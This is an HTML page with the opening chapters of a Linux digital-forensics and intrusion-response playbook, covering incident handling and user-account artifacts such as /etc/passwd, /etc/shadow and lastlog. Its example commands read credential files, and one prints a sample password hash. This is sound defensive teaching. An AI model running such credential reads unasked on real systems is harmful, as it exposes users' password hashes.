<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Digital forensics &amp; Intrusion Response Playbook - *nix OS</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="chapters/01-README.html">Introduction</a></li><li class="chapter-item expanded affix "><a href="chapters/02-recommended_reading.html">Recommended Reading</a></li><li class="chapter-item expanded affix "><a href="chapters/03-incident_handling.html">Incident Handling</a></li><li class="chapter-item expanded "><a href="chapters/04-os_accounts.html"><strong aria-hidden="true">1.</strong> User Accounts</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="chapters/05-os_accounts_local.html"><strong aria-hidden="true">1.1.</strong> Local User Accounts</a></li><li class="chapter-item expanded "><a href="chapters/06-os_accounts_ad.html"><strong aria-hidden="true">1.2.</strong> Active Directory Accounts</a></li><li class="chapter-item expanded "><a href="chapters/07-os_accounts_forensics.html"><strong aria-hidden="true">1.3.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="chapters/08-01-lateral_movement.html"><strong aria-hidden="true">2.</strong> Lateral Movement</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="chapters/08-02-lateral_forensics.html"><strong aria-hidden="true">2.1.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="chapters/09-persistence.html"><strong aria-hidden="true">3.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="chapters/10-1-persistence_cron.html"><strong aria-hidden="true">3.1.</strong> Cron Jobs</a></li><li class="chapter-item expanded "><a href="chapters/10-2-autostart.html"><strong aria-hidden="true">3.2.</strong> Autostart</a></li><li class="chapter-item expanded "><a href="chapters/13-persistence_forensics.html"><strong aria-hidden="true">3.3.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="chapters/14-execution.html"><strong aria-hidden="true">4.</strong> Execution</a></li><li class="chapter-item expanded "><a href="chapters/16-webhistory.html"><strong aria-hidden="true">5.</strong> Web Artifacts</a></li><li class="chapter-item expanded "><a href="chapters/17-open_ports_active_conn.html"><strong aria-hidden="true">6.</strong> Open Ports / Active Connections</a></li><li class="chapter-item expanded "><a href="chapters/19-dns_cache.html"><strong aria-hidden="true">7.</strong> DNS Cache records</a></li><li class="chapter-item expanded "><a href="chapters/21-01-log_analysis.html"><strong aria-hidden="true">8.</strong> Log Analysis</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="chapters/21-02-audit_log.html"><strong aria-hidden="true">8.1.</strong> Audit log</a></li><li class="chapter-item expanded "><a href="chapters/21-03-system_messages_log.html"><strong aria-hidden="true">8.2.</strong> System log</a></li><li class="chapter-item expanded "><a href="chapters/21-04-security_log.html"><strong aria-hidden="true">8.3.</strong> Security log</a></li><li class="chapter-item expanded "><a href="chapters/21-03-logon_attempts.html"><strong aria-hidden="true">8.4.</strong> Logon attempts</a></li><li class="chapter-item expanded "><a href="chapters/21-04-scheduled_task_exe.html"><strong aria-hidden="true">8.5.</strong> Scheduled task execution</a></li><li class="chapter-item expanded "><a href="chapters/21-05-installed_apps.html"><strong aria-hidden="true">8.6.</strong> Installed applications</a></li></ol></li><li class="chapter-item expanded "><a href="chapters/22-config.html"><strong aria-hidden="true">9.</strong> System</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><a href="chapters/25-about.html">About</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Digital forensics &amp; Intrusion Response Playbook - *nix OS</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <div id="chapters-01-readme"></div><h1 id="chapters-01-readme-introduction"><a class="header" href="#chapters-01-readme-introduction">Introduction</a></h1>
<p>In the current digital environment, robust and targeted incident response strategies are necessary to tackle the range of cyber threats organizations face. Despite Linux systems' inherent security strengths, they remain potential targets for attackers. Therefore, It is important to have a Linux-specific incident response playbook, which is the purpose of the <strong>TuxTriage Playbook</strong>.</p>
<p>The <strong>TuxTriage Playbook</strong> is an incident response playbook specifically developed for the Linux Operating Systems. It facilitates the triage and examination of suspicious live hosts, allowing for swift incident identification, triage, and evidence collection.</p>
<p>The playbook addresses several key investigative points that can aid an examiner in understanding the extent of a potential breach:</p>
<ul>
<li>
<p><strong>User Accounts</strong>: This section aims to identify all user accounts on the system, their respective permissions, and any recent account modifications. These details can reveal unauthorized system access.</p>
</li>
<li>
<p><strong>Lateral Movement</strong>: The playbook evaluates if the attacker has managed to gain access to other systems in the network. Identifying the tactics used in this movement can help improve defense mechanisms.</p>
</li>
<li>
<p><strong>Malware Persistence</strong>: This segment assesses how malware has managed to persist on the system, including using known persistence techniques such as auto-runs, allowing for a comprehensive malware investigation and removal process.</p>
</li>
<li>
<p><strong>Data Theft</strong>: The playbook investigates whether the attacker has attempted to access data within the system. This information is crucial in understanding the scope of the breach and informing recovery efforts.</p>
</li>
<li>
<p><strong>Configuration Management</strong>: The final section evaluates the current state of the system's configuration, detecting recent modifications that may indicate system compromise.</p>
</li>
</ul>
<p>By addressing each of these areas, the TuxTriage Playbook provides a rapid response protocol for incidents and informs long-term strategies for system hardening and threat prevention. This playbook is essential in navigating the challenges of Linux system breaches, ensuring a swift and effective incident response.</p>
<h2 id="chapters-01-readme-how-to-use-this-book"><a class="header" href="#chapters-01-readme-how-to-use-this-book">How to use this book?</a></h2>
<p>This book has been designed to be both a comprehensive guide and a handy reference manual for anyone interested in intrusion analysis. It provides a deep dive into raw files, data structures, and forensics artifacts, serving as a rich resource for both beginners and seasoned professionals in the field. Please take a moment to read through the following guidelines to make the most out of this resource.</p>
<p><strong>Start with Basics</strong>: If you are a beginner or need a refresher on the basic concepts, start from the first chapters that detail the raw files and data structures used in intrusion analysis.</p>
<p><strong>Understand the Data Structures</strong>: This book discusses data structures and file formats in detail. Ensure you understand these since they form the crux of many analyses that follow. The objective is to understand the file's contents and its limitations comprehensively.</p>
<p><strong>Explore Forensic Artifacts</strong>: Details about forensic artifacts that may be relevant to intrusion analysis are provided under each section of the book. These chapters can be instrumental in your practical work, allowing you to identify better, analyze, and interpret forensics artifacts during intrusion analysis.</p>
<p><strong>Refer to the Datasource Catalog</strong>: The Datasource Catalog section serves as a quick reference guide for all files of interest mentioned in the book. It briefly describes each file and its significance in intrusion analysis. You can refer to this section when encountering unfamiliar files or need to understand a file's relevance quickly.</p>
<p><strong>Recognize System-Specific Limitations</strong>: Please note that some files discussed in this book may not exist on certain systems based on their specific configurations. If you encounter this, don't be alarmed. This book aims to be as comprehensive as possible, but the nature of diverse system configurations means that not all files will be present on all systems.</p>
<p><strong>Minimized Use of System Commands</strong>: This book diverges from many other resources on the subject matter by largely refraining from using built-in system commands, save for the inspection of file contents using the <code>cat</code> command. This approach is adopted for several critical reasons:</p>
<ul>
<li>
<p><strong>Preservation of Evidence</strong>: To maintain the integrity of the investigation, we should avoid tampering with the system's state. Running various commands may inadvertently alter the system's state under scrutiny, potentially impacting the reliability of the evidence.</p>
</li>
<li>
<p><strong>Compatibility with Disk Images</strong>: The utilization of disk images is a common practice in digital forensics. Within this context, executing commands is typically unfeasible. By focusing on raw files and data structures, this book ensures its teachings are applicable even when working with disk images.</p>
</li>
<li>
<p><strong>Enabling Evidence Extraction</strong>: This book provides the knowledge necessary to extract relevant files from the system and conduct detailed analyses on a separate forensic workstation by focusing on raw files and data structures. This method ensures the preservation of the original evidence and enhances the overall investigative process by providing more flexibility and control over the analysis environment.</p>
</li>
</ul>
<p>This book is designed to be a journey into the heart of intrusion analysis, taking you from the basics to the complexities of forensic artifacts. By studying, practicing, and understanding the principles within, you'll be well-prepared to tackle real-world intrusion analysis tasks and challenges. </p>
<p>Happy hunting!</p>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-02-recommended_reading"></div><h1 id="chapters-02-recommended_reading-recommended-reading"><a class="header" href="#chapters-02-recommended_reading-recommended-reading">Recommended Reading</a></h1>
<p>The following resources provide substansial background on the cyber incident response process. </p>
<h2 id="chapters-02-recommended_reading-cisa-cybersecurity-incident--vulnerability-response-playbooks-1"><a class="header" href="#chapters-02-recommended_reading-cisa-cybersecurity-incident--vulnerability-response-playbooks-1">CISA: Cybersecurity Incident &amp; Vulnerability Response Playbooks <sup class="footnote-reference"><a href="#chapters-02-recommended_reading-cisa">1</a></sup></a></h2>
<p>Operational Procedures for Planning and Conducting Cybersecurity Incident and Vulnerability Response Activities in FCEB Information Systems.</p>
<h3 id="chapters-02-recommended_reading-when-to-use-this-playbook"><a class="header" href="#chapters-02-recommended_reading-when-to-use-this-playbook">When to use this playbook</a></h3>
<p>Use this playbook for incidents that involve confirmed malicious cyber activity for which a major incident has been declared or not yet been reasonably ruled out.</p>
<h2 id="chapters-02-recommended_reading-nist-computer-security-incident-handling-guide-2"><a class="header" href="#chapters-02-recommended_reading-nist-computer-security-incident-handling-guide-2">NIST: Computer Security Incident Handling Guide <sup class="footnote-reference"><a href="#chapters-02-recommended_reading-nist">2</a></sup></a></h2>
<p>This document has been created for computer security incident response teams (CSIRTs), system and network administrators, security staff, technical support staff, chief information officers (CIOs), computer security program managers, and others who are responsible for preparing for, or responding to, security incidents</p>
<h2 id="chapters-02-recommended_reading-cert-sg-unixlinux-intrusion-detection--3"><a class="header" href="#chapters-02-recommended_reading-cert-sg-unixlinux-intrusion-detection--3">CERT SG: UNIX/LINUX Intrusion Detection  <sup class="footnote-reference"><a href="#chapters-02-recommended_reading-SG">3</a></sup></a></h2>
<p>A cheat sheet dedicated to handlers investifating on a precise security issue. </p>
<h3 id="chapters-02-recommended_reading-who-should-use-irm-sheets"><a class="header" href="#chapters-02-recommended_reading-who-should-use-irm-sheets">Who should use IRM sheets</a></h3>
<ul>
<li>Administrators </li>
<li>Security Operation Center </li>
<li>CISOs and deputies </li>
<li>CERTs </li>
</ul>
<div class="footnote-definition" id="chapters-02-recommended_reading-cisa"><sup class="footnote-definition-label">1</sup>
<p><a href="https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf">https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf</a></p>
</div>
<div class="footnote-definition" id="chapters-02-recommended_reading-nist"><sup class="footnote-definition-label">2</sup>
<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf</a> </p>
</div>
<div class="footnote-definition" id="chapters-02-recommended_reading-SG"><sup class="footnote-definition-label">3</sup>
<p><a href="https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf">https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-03-incident_handling"></div><h1 id="chapters-03-incident_handling-incident-handling-steps"><a class="header" href="#chapters-03-incident_handling-incident-handling-steps">Incident Handling Steps</a></h1>
<p>The incident response life cycle as defined by NIST Computer Security
Incident Handling Guide<sup class="footnote-reference"><a href="#chapters-03-incident_handling-nist">1</a></sup> has the following 5 steps:</p>
<ul>
<li><strong>Preparation</strong> </li>
<li><strong>Detection &amp; Analysis</strong></li>
<li><strong>Containment, Eradication &amp; Recovery</strong></li>
<li><strong>Post-Incident Activity</strong></li>
</ul>
<p>This playbook may be used to aid in the first two steps of the life cycle. </p>
<h2 id="chapters-03-incident_handling-preparation-phase"><a class="header" href="#chapters-03-incident_handling-preparation-phase">Preparation Phase</a></h2>
<p>The preparation phase calls for the establishment and training of an incident response team along with acquiring the necessary tools and resources to perform the response activities. 
This playbook is designed as a training guide for analysts working with Linux OS. </p>
<h2 id="chapters-03-incident_handling-detection--analysis"><a class="header" href="#chapters-03-incident_handling-detection--analysis">Detection &amp; Analysis</a></h2>
<p>Signs of an incident fall into one of two categories: <em>precursors</em> and <em>indicators</em>. A precursor is a sign that an incident may occur in the future. An indicator is a sign that an incident may have occurred or may be
occurring now <sup class="footnote-reference"><a href="#chapters-03-incident_handling-nist">1</a></sup>.</p>
<p>The playbook serves as a handbook and provides the sources for <em>indicators</em>. It details where to look for indicators, what conclusions can be drawn from the indicators as well as the data structure and organization of such artifacts. </p>
<h2 id="chapters-03-incident_handling-todo"><a class="header" href="#chapters-03-incident_handling-todo">TODO</a></h2>
<ul>
<li>Add the incident response process picture </li>
<li>Explain the process in detail </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-04-os_accounts"></div><h1 id="chapters-04-os_accounts-user-accounts"><a class="header" href="#chapters-04-os_accounts-user-accounts">User Accounts</a></h1>
<p>User accounts are a crucial component of any digital forensics investigation. They provide valuable information about who had access to a system, what they did while logged in, and what resources they may have accessed. </p>
<p>User accounts can be local to the host or managed centrally using Active Directory, OpenLDAP, Novell eDirectory, etc.</p>
<p>There are three main types of user accounts on a Linux System:</p>
<ul>
<li>
<p><strong>Superuser account</strong>: Also known as the root, this account has full administrative privileges on the system. </p>
</li>
<li>
<p><strong>Regular user account</strong>: Regular user accounts have limited access to the system. They may only access files and resources they are explicitly granted access. A regular user can be granted additional privileges by adding the user to a group with the desired privileges or by granting the user specific permissions on specific files or directories. </p>
</li>
<li>
<p><strong>System account (Service account)</strong>: System accounts correspond to a service running on the system rather than to someone using the system. Service accounts are used by system services such as web servers, mail transport agents, databases etc. Note that there is no formal distinction between a regular user account vs. a system/service account at a system level. The key differences are that a regular user account has a login shell and wider privileges. </p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-05-os_accounts_local"></div><h1 id="chapters-05-os_accounts_local-local-user-accounts"><a class="header" href="#chapters-05-os_accounts_local-local-user-accounts">Local User Accounts</a></h1>
<p>These are accounts local to the host. </p>
<p>Local account information are stored in two files. </p>
<pre><code class="language-bash">/etc/passwd 
</code></pre>
<pre><code class="language-bash">/etc/shadow
</code></pre>
<p>Additionally group information is saved at the following location.</p>
<pre><code class="language-bash">/etc/group
</code></pre>
<pre><code class="language-bash">/etc/gshadow
</code></pre>
<h2 id="chapters-05-os_accounts_local-etcpasswd-1"><a class="header" href="#chapters-05-os_accounts_local-etcpasswd-1">/etc/passwd <sup class="footnote-reference"><a href="#chapters-05-os_accounts_local-rhel_pswd">1</a></sup></a></h2>
<p>The <code>/etc/passwd</code> file is a text file. Each line represents information about a single user account. This fields are seperated by a colon (<code>:</code>) symbol. There are seven fields saved in each row <sup class="footnote-reference"><a href="#chapters-05-os_accounts_local-nxcraft">2</a></sup>.</p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc ~]$ cat /etc/passwd | grep tlasso
tlasso:x:1000:1001:tlasso:/home/tlasso:/bin/bash
[tlasso@rhel-richmondfc ~]$
</code></pre>
<ol>
<li><code>Username</code>: The user name of the user. </li>
<li><code>Password</code>: An x character indicates that the password is in the <code>/etc/shadow</code> file. </li>
<li><code>User ID (UID)</code>: A unique id assigned to the user</li>
<li><code>Group ID (GID)</code>: The primary group ID. </li>
<li><code>User ID Info</code>: Additional user information </li>
<li><code>Home Directory</code>: Home directory of a user</li>
<li><code>Command/shell</code>: Typically this is a shell. But if an account does not have interactive logon privileges then this can be set to <code>/sbin/nologin</code></li>
</ol>
<h2 id="chapters-05-os_accounts_local-etcshadow-3"><a class="header" href="#chapters-05-os_accounts_local-etcshadow-3">/etc/shadow <sup class="footnote-reference"><a href="#chapters-05-os_accounts_local-rhel_shdw">3</a></sup></a></h2>
<p>The <code>/etc/shadow</code> file contains one entry per line for each user account on the system. Each entry consists of several fields separated by colons (<code>:</code>). The fields typically include the username, password hash, and various account-related information such as password expiration, account expiration, and account locking.</p>
<p>The password hash stored in the <code>/etc/shadow</code> file is an encrypted version of the user's password. When a user attempts to log in, the system takes the password entered by the user, applies the same encryption algorithm, and compares the resulting hash with the one stored in the <code>/etc/shadow</code> file. If the hashes match, the user is granted access.</p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc ~]$ sudo cat /etc/shadow | grep tlasso
tlasso:$6$jP1ap6xJUfvAgVjH$JxTdfXUOIqbpa3FpgALilTJvGnUfuUcDn8Qz.cxBf6yrFjo2332IHsCkHtg9QCHM7A4p9EcOZn.tXBWYK3RVO0::0:99999:7:::
</code></pre>
<ol>
<li><code>Username</code>: The user name of the user.</li>
<li><code>Password</code>: Encrypted password in hash format.</li>
<li><code>Last password change date</code>: Data type is Long. 0 indicates that the user must change the password on next logon. Empty value inidcates that feature is disabled. A long value greater than 0 indicates the date of password change expressed in the form of days since Unix epoch. </li>
</ol>
<h2 id="chapters-05-os_accounts_local-etcgroup-4"><a class="header" href="#chapters-05-os_accounts_local-etcgroup-4">/etc/group <sup class="footnote-reference"><a href="#chapters-05-os_accounts_local-rhel_grp">4</a></sup></a></h2>
<p>The <code>/etc/group</code> file contains a list of groups, one entry per line. Each line is colon delimited and contains four fields. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc ~]$ sudo cat /etc/group | grep tlasso
wheel:x:10:tlasso
coaching-staff:x:1000:tlasso
</code></pre>
<ol>
<li><code>Group name</code>: Name of the group </li>
<li><code>Group Password</code>: When this field is set to <code>x</code>, then a password is required to join the group. </li>
<li><code>Group Id (GID)</code>: A numeric group id</li>
<li><code>Member List</code>: The list of users that belong to the group. List is comma seperated. </li>
</ol>
<h2 id="chapters-05-os_accounts_local-etcgshadow-5"><a class="header" href="#chapters-05-os_accounts_local-etcgshadow-5">/etc/gshadow <sup class="footnote-reference"><a href="#chapters-05-os_accounts_local-rhel_grp_shdw">5</a></sup></a></h2>
<p>The <code>/etc/gshadow</code> file contains the encrypted group password, group membership and administrator information. This file also contains information per group per line. It is colon delimeted and lists the members of the group in a comma seperated list </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc ~]$ sudo cat /etc/gshadow | grep tlasso
wheel:::tlasso
coaching-staff:!::tlasso 
</code></pre>
<ol>
<li><code>Group name</code> : Name of the group </li>
<li><code>Encrypted password</code>: Group password</li>
<li><code>Group administrators</code>: Comma delimited list of users. Add or remove from this list using <code>gpasswd</code> command. </li>
<li><code>Group members</code> : Non-admin group members.</li>
</ol>
<h2 id="chapters-05-os_accounts_local-varloglastlog"><a class="header" href="#chapters-05-os_accounts_local-varloglastlog">/var/log/lastlog</a></h2>
<p>The <code>/var/log/lastlog</code> file contains the list of records for last login times mapped by user ids. The <code>lastlog</code> command may be used to display its contents. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc Documents]$ lastlog
Username         Port     From                                       Latest
root             pts/0                                              Wed Jun 14 02:53:13 -0400 2023
bin                                                                 **Never logged in**
daemon                                                              **Never logged in**
... ... ...
adm                                                                 **Never logged in**
gdm              tty1                                               Sun Jul  2 12:04:28 -0400 2023
tlasso           tty2                                               Sun Jul  2 12:04:37 -0400 2023
</code></pre>
<p>The <code>lastlog</code> file, in binary format, stores crucial data about the most recent logon activity of local user accounts. Each logon record within this file is composed of 292 bytes. To parse through this binary data and locate a specific logon record for a user based on the user ID (UID), you'll need to calculate the seek position within the file. For instance, for a user with <code>UID=1000</code>, the seek position is calculated as <code>pos=292*1000</code>, which, in hexadecimal, is <code>000474a0</code>. This position denotes where the user's logon record begins in the file. The record itself is divided into two segments: the first 32 bytes hold the timestamp of the last logon, and the remaining bytes store information about the host. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc Documents]$ hexdump -C /var/log/lastlog 
00000000  d9 63 89 64 70 74 73 2f  30 00 00 00 00 00 00 00  |.c.dpts/0.......|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00002fe0  00 00 00 00 00 00 00 00  0c a0 a1 64 74 74 79 31  |...........dtty1|
00002ff0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000474a0  15 a0 a1 64 74 74 79 32  00 00 00 00 00 00 00 00  |...dtty2........|
000474b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</code></pre>
<h2 id="chapters-05-os_accounts_local-user-account-creation"><a class="header" href="#chapters-05-os_accounts_local-user-account-creation">User account creation</a></h2>
<p>Please refer to RHEL<sup class="footnote-reference"><a href="#chapters-05-os_accounts_local-rhel_doc">6</a></sup> documentation for details and command references for user creation. </p>
<div class="footnote-definition" id="chapters-05-os_accounts_local-rhel_doc"><sup class="footnote-definition-label">6</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s2-users-cl-tools">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s2-users-cl-tools</a></p>
</div>
<div class="footnote-definition" id="chapters-05-os_accounts_local-nxcraft"><sup class="footnote-definition-label">2</sup>
<p><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></p>
</div>
<div class="footnote-definition" id="chapters-05-os_accounts_local-rhel_pswd"><sup class="footnote-definition-label">1</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files#s3-acctsgrps-passwd">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files#s3-acctsgrps-passwd</a></p>
</div>
<div class="footnote-definition" id="chapters-05-os_accounts_local-rhel_shdw"><sup class="footnote-definition-label">3</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-shadow">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-shadow</a></p>
</div>
<div class="footnote-definition" id="chapters-05-os_accounts_local-rhel_grp"><sup class="footnote-definition-label">4</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctspgrps-group">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctspgrps-group</a></p>
</div>
<div class="footnote-definition" id="chapters-05-os_accounts_local-rhel_grp_shdw"><sup class="footnote-definition-label">5</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-gshadow">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-gshadow</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-06-os_accounts_ad"></div><h1 id="chapters-06-os_accounts_ad-active-directory-accounts"><a class="header" href="#chapters-06-os_accounts_ad-active-directory-accounts">Active Directory Accounts</a></h1>
<p>Active directory accounts are managed by the AD server. No local entries are manintained by the host regarding them. </p>
<p>System Security Services Daemon <code>(SSSD)</code> is generally used by RHEL for AD based authentication. </p>
<p>This is not limited to AD, the following combinations are supported. <sup class="footnote-reference"><a href="#chapters-06-os_accounts_ad-rhel_sssd">1</a></sup></p>
<div class="table-wrapper"><table><thead><tr><th>Identity Provider</th><th>Authentication Provider</th></tr></thead><tbody>
<tr><td>Identity Management</td><td>Identity Management</td></tr>
<tr><td>Active Directory</td><td>Active Directory</td></tr>
<tr><td>LDAP</td><td>LDAP</td></tr>
<tr><td>LDAP</td><td>Kerberos</td></tr>
<tr><td>Proxy</td><td>Proxy</td></tr>
<tr><td>Proxy</td><td>LDAP</td></tr>
<tr><td>Proxy</td><td>Kerberos</td></tr>
</tbody></table>
</div>
<p>SSSD does not create user accounts on the local system. However, SSSD can be configured to create home directories for IdM users. Once created, an IdM user home directory and its contents on the client are not deleted when the user logs out <sup class="footnote-reference"><a href="#chapters-06-os_accounts_ad-rhel_sssd">1</a></sup>. </p>
<p><img src="chapters/./images/sssd_cache.png" alt="SSSD Works" /></p>
<p>SSSD maintains a local cache about the users that attempted to logon to the local system. </p>
<h3 id="chapters-06-os_accounts_ad-uidgid-for-ad-users"><a class="header" href="#chapters-06-os_accounts_ad-uidgid-for-ad-users">UID/GID for AD Users</a></h3>
<p>Windows uses security ids (SID) and is incompatible with Linux UID/SID. SSSD autogenerates the UID and GID from the SIDs when the user logs on to a linux host for the first time. This information is cached as mentioned above. Note that the UID generated from a SID is always the same. </p>
<p>ID mapping can be disabled. This should be used if AD defined POSIX attributes are to be used instead. </p>
<div class="footnote-definition" id="chapters-06-os_accounts_ad-rhel_sssd"><sup class="footnote-definition-label">1</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-07-os_accounts_forensics"></div><h1 id="chapters-07-os_accounts_forensics-forensic-artifacts"><a class="header" href="#chapters-07-os_accounts_forensics-forensic-artifacts">Forensic Artifacts</a></h1>
